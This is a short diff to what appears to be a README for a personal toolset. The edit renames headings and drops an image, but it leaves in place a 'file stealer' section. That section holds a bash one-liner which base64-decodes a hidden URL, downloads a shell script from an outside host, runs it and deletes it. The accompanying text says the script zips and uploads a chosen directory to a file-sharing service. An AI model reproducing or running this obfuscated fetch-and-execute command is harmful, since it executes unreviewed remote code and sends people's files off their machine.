@@ -51,9 +51,7 @@
 ```pacman -S php```
 
 
-# info
-![info](https://r2.e-z.host/1aef6b94-3653-4c51-8fef-6587df7580f5/qos28fmh.png)
-
-### file stealer
+# more
+## file stealer
 ```bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'```
-(downloads and runs [this script](https://catlitter.minoa.cat/api/view/ad0b512a76b50c88ecef.sh) that zips and uploads whatever dir you enter to gofile and gives you the link only on linux)
+*(downloads and runs [this script](https://catlitter.minoa.cat/api/view/ad0b512a76b50c88ecef.sh) that zips and uploads whatever dir you enter to gofile and gives you the link only on linux)*
